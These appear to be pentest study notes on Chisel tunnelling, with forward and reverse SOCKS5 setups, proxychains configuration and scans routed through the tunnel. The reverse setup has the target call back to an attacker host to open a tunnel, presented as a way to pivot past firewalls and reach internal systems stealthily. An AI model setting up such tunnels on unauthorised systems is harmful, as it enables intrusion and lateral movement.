## **Chisel Forward Proxy – Full Notes**


# 1. Chisel Forward SOCKS Proxy Setup

## 📌 Use Case
- When **you want to access** the remote machine (target) **directly via a SOCKS proxy**.
- The **target runs Chisel server**, and your **machine runs Chisel client**.
- You can only proxy into the machine **hosting the server**, not beyond it.

---

## 🛠️ Architecture

```mermaid
flowchart TD
    A["Attacker (Your Machine)"] -->|SOCKS5 Proxy| B
    B[Target Host<br>Chisel Server]
````

---

## **⚙️ Step-by-Step**
  

### **1. 🔥 On Target (Chisel Server)**

```
./chisel server --socks5 --port 8080
```

- Exposes a SOCKS5 proxy on port 8080
     

### **2. 🚀 On**  **Attacker (Chisel Client)**

```
./chisel client <target_ip>:8080 socks
```

- Sets up a local SOCKS5 proxy at 127.0.0.1:1080
    

---

## **🧩 ProxyChains Config**

```
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
```

---

## **✅ Example Usage**

```
proxychains4 curl http://<target_ip>
proxychains4 nmap -sT -Pn <target_ip>
```

---

## **⚠️ Limitations**

|**Issue**|**Explanation**|
|---|---|
|No internal pivoting|You can only access the **Chisel server host**. Not useful for lateral movement.|
|You need target to run server|In many cases, you won’t be able to run a server on the target due to restrictions.|




# 🧠 **Chisel Reverse SOCKS Proxy – Full Notes**

# 2. Chisel Reverse SOCKS Proxy Setup

## 📌 Use Case
- When the **target cannot be accessed directly**, but can **make outbound connections**.
- Used for **pivoting**, **bypassing NAT/firewalls**, and reaching **internal networks**.
- **Attacker runs server**, **target runs client**.


## 🛠️ Architecture

```mermaid
flowchart TD
    target["Target Machine<br>(Chisel Client R:socks)"]
    attacker["Attacker Machine<br>(Chisel Server + ProxyChains)"]
    proxy[SOCKS5 Proxy at 127.0.0.1:1080]
    internal["Internal System<br>(Behind Target)"]

    target --> attacker
    attacker --> proxy --> internal
````

---

## **⚙️ Step-by-Step**

  

### **1. 🔥 On** Attacker (Chisel Server)**

```
./chisel server --reverse
```

- Listens on port 8080 by default
    
- Accepts reverse tunnels
    

  

### **2. 🚀 On**  **Target (Chisel Client)**

```
./chisel client <attacker_ip>:8080 R:socks
```

- Reverse SOCKS tunnel back to attacker
    
- Opens 127.0.0.1:1080 SOCKS proxy on attacker
    

---

## **🧩 ProxyChains Config (on Attacker)**
```

/opt/homebrew/etc/proxychains.conf
```


```
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080
```

---

## **✅ Example Usage**

```
proxychains4 nxc smb 10.10.10.X
proxychains4 nmap -sT -Pn 10.10.10.X
```

---

## **✅ Advantages**

| **Feature**                 | **Benefit**                                                |
| --------------------------- | ---------------------------------------------------------- |
| Works through firewalls/NAT | Target just needs outbound TCP                             |
| Enables lateral movement    | You can access internal systems behind the target          |
| Stealthier                  | Harder to detect than binding ports or exposing web shells |

---



## **✅ Key Differences Between SOCKS4 and SOCKS5**

|**Feature**|**SOCKS4**|**SOCKS5**|
|---|---|---|
|**Protocol Type**|TCP only|TCP + UDP|
|**Authentication Support**|No|Yes (username/password or GSSAPI)|
|**Remote DNS Support**|❌ DNS resolved _locally_|✅ DNS resolved _through proxy_|
|**IPv6 Support**|No|Yes|
|**Security**|No built-in security|Can support auth/encryption layers|
|**ProxyChains Compatibility**|Supported|Recommended (with proxy_dns)|
|**Typical Use Cases**|Basic proxying, older tools|Modern tools, secure tunneling|
